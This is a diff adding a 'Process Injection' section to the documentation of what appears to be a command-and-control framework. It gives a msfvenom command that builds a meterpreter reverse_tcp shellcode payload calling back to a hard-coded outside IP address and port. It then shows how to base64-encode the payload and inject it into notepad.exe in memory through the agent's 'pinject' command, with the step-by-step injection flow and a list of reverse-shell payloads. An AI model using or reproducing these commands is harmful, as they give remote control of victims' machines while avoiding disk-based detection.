@@ -12,7 +12,7 @@
 - [File Operations](#file-operations)
 - [Task Chaining](#task-chaining-web-ui-only)
 - [Task Management](#task-management)
-- [Profiles and Staging](#profiles-and-staging)
+- [Process Injection](#process-injection)
 - [Event Monitoring](#event-monitoring)
 - [Security Features](#security-features)
 - [Troubleshooting](#troubleshooting)
@@ -447,6 +447,48 @@ result list
 result <agent_id>
 result <agent_id> <task_id>
 ```
+
+## Process Injection
+
+## Usage
+1. Generate compatible shellcode using msfvenom
+2. Use the module with a base64 encoded shellcode string
+3. The agent will inject the shellcode into notepad.exe in-memory
+
+## msfvenom Command Syntax
+Generate shellcode with proper null byte avoidance and correct format:
+
+   1    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw -o shellcode.bin
+   2    # Then base64 encode it before sending to the module
+   3     base64 -w 0 shellcode.bin
+
+```
+# Two ways of running pinject
+pinject <shellcode> [agent_id=<agent_id>]
+run pinject shellcode=<path_to_shellcode/b64>
+```
+
+## Notes
+- Ensure notepad.exe is running on the target system
+- The shellcode must be in raw binary format (use `-f raw`)
+- The module performs in-memory injection - no files are written to disk
+- Debug print statements are included in the agent for monitoring execution flow
+- The console hiding capability has been temporarily disabled for debugging
+
+## Process Injection Flow
+1. Find target process (notepad.exe) PID
+2. Open process with appropriate permissions
+3. Allocate memory in target process
+4. Write shellcode to allocated memory
+5. Change memory protection to executable
+6. Create remote thread to execute shellcode
+7. All operations performed in-memory without touching disk
+
+## Supported Payloads
+- windows/x64/meterpreter/reverse_tcp
+- windows/x64/shell_reverse_tcp
+- windows/x64/exec
+- Any custom raw shellcode
 
 
 ## Event Monitoring
